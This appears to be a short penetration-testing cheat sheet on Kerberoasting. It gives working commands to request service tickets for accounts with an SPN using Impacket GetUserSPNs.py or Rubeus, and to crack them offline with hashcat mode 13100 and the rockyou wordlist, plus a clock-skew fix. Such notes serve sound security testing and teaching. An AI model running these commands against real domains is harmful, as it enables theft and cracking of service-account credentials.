# Kerberoast

***Most popular Kerberos attack***
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password  
This can be abused because TGS are crypted with the user's hash.  

Requirements : Credentials 


# Request for kerberoastable users
## Using Impacket
```bash
# From the local machine
GetUserSPNs.py DOMAIN/"username":"password" -dc-ip <IP> -request
```

## Using Rubeus
```cmd
:: Directly onto the target shell
Rubeus.exe kerberoast
```


# Crack the hash
```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## Error handling
The error **Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)** means that the DC time is not synchronized with your local time

Mitigation : `rdate -n <IP of DC>`
/!\\ be sure to unset automatic time from your settings